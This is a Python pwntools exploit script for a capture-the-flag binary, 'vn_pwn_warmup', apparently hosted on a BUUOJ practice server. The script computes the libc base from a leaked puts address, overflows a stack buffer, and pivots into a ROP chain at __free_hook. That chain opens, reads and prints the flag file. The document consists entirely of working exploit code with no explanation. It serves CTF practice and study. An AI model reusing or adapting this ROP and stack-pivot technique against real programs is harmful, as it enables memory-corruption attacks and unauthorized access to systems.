# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './vn_pwn_warmup'
e = ELF(file)
libc = e.libc
rlibc = ''
ip = 'node3.buuoj.cn'
port = '27560'
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.attach(p, code)


def run(local):
    global p, libc, debug
    if local == 1:
        debug = True
        p = process(file)
    else:
        p = remote(ip, port)
        debug = False
        if rlibc != '':
            libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run(0)
ru("gift: ")
libc.address = int(ru("\n"), 16) - libc.symbols['puts']
log.success(hex(libc.address))
addrsp140 = libc.address +0x0000000000035d8a
pushrsi = libc.address +0x0000000000034bcf
poprdi = libc.address +0x0000000000021102
poprsi = libc.address +0x00000000000202e8
poprdx = libc.address +0x0000000000001b92
poprsp = libc.address +0x0000000000003838

rop_chain = 'b' * 0x148 + p64(poprsi) + p64(libc.symbols['__free_hook']) + p64(poprdx) + p64(0x200) + p64(libc.symbols['read']) + p64(poprsp) + p64(libc.symbols['__free_hook'] + 8)


rc()
se(rop_chain)
rc()
dbg("breakrva 0x9D2")
se('./flag\x00'.ljust(0x78, 'a') + p64(addrsp140))

rop_chain = p64(poprdi) + p64(libc.symbols['__free_hook']) + p64(poprsi) + p64(0) + p64(libc.symbols['open'])
rop_chain += p64(poprdi) + p64(3) + p64(poprsi) + p64(libc.symbols['__free_hook']) + p64(libc.symbols['read'])
rop_chain += p64(poprdi) + p64(1) + p64(poprsi) + p64(libc.symbols['__free_hook']) + p64(libc.symbols['write'])
rop_chain += p64(poprdi) + p64(libc.symbols['__free_hook']) + p64(libc.symbols['puts'])
se('./flag\x00\x00' + rop_chain)
shell()